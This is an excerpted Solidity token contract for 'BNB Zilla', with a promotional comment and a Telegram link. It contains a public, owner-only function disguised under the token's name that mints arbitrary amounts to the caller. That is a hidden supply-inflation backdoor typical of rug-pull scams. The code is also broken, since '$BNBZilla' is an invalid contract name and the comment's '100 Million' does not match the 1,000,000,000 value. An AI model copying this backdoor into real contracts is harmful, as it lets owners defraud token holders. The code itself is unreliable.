...
//
// $BNBZilla proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/BNBZillaCN
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BNBZilla(uint256 amount) public onlyOwner {
 _BNBZilla(msg.sender, amount);
    }
    ...
    function _BNBZilla(address account, uint256 amount) internal virtual {
...
contract $BNBZilla is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BNB Zilla", "BNBZILLA") {
     _BNBZilla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}